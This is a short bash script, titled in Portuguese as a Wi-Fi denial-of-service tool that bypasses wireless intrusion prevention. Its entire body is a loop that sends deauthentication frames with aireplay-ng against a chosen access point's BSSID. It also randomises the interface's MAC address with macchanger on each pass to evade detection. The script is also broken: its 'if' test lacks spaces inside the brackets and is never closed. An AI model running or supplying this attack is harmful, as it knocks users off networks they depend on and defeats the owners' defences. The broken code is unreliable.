#!/bin/bash

if ["$1" == ""]
then
	echo "ELIZEUOPAIN - DoS Wifi - Bypass WIPS"
	echo "Modo de uso: $0 interface(wlan1) canal(6) BSSID(MAC Adress Alvo)"
	echo "Exemplo: $0 wlan1mon 6 FF:GG:BB:CC:AA"

while true
do
	iw dev $1 set channel $2
	aireplay-ng --deauth 1 -a $3 $1 | grep "deauth"
	macchanger -r $1 | grep "New Mac"
	ip link set $1 up
	sleep 5
done
